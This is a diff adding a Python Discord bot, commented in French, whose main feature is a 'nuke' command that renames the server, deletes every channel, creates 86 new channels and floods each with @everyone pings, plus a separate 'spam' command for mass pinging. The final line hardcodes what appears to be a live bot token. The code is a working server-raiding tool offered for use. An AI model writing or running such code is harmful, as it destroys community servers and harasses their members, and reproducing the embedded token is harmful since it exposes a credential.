@@ -1,0 +1,58 @@
+import discord
+from discord.ext import commands, tasks
+import os
+import asyncio
+
+prefix='!'
+n=0
+
+intents=discord.Intents.default()
+intents = discord.Intents(messages=True, guilds=True)
+
+
+client = commands.Bot(command_prefix=prefix, intents=intents)
+@client.event
+async def on_ready():
+    print('Bot its onlyne ')
+    await client.change_presence(activity=discord.Game('Regarde Roach,Soap,Price'))
+
+@client.command()
+async def ping(ctx):
+    await ctx.send(f'Pong! {round(client.latency * 1000)}ms')
+
+
+@client.command
+async def invite(ctx):
+  await ctx.reply('')
+
+@client.command()
+async def nuke(ctx):
+
+    await ctx.guild.edit(name='TEST') #mettez se que vous voulez sa changera le nom du serveur 
+    for c in ctx.guild.channels:
+        await c.delete()
+
+    guild = ctx.message.guild
+
+    n=0
+    while(n<=85):
+        await guild.create_text_channel('TEST') #mettez se que vous voulez sa fera des salon 
+        n = n+1
+
+    for c in ctx.guild.text_channels:
+             await c.send('@everyone TEST ') #écrive le message que vous voulez que sa spam
+             await c.send('@everyone TEST')
+             await c.send('@everyone TEST')
+             await c.send('@everyone TEST')
+             await c.send('@everyone TEST')
+
+@client.command()
+async def spam(ctx):
+    for c in ctx.guild.text_channels:
+             await c.send('@everyone TEST') #écrive le message que vous voulez que sa spam
+             await c.send('@everyone TEST')
+             await c.send('@everyone  TEST')
+             await c.send('@everyone TEST')
+             await c.send('@everyone TEST')
+
+client.run('ODgxOTI5NDE0NzA1ODM2MDYz.YSz-xQ.11wTHZOK8uA-N1T0AwnjnfPVd04')
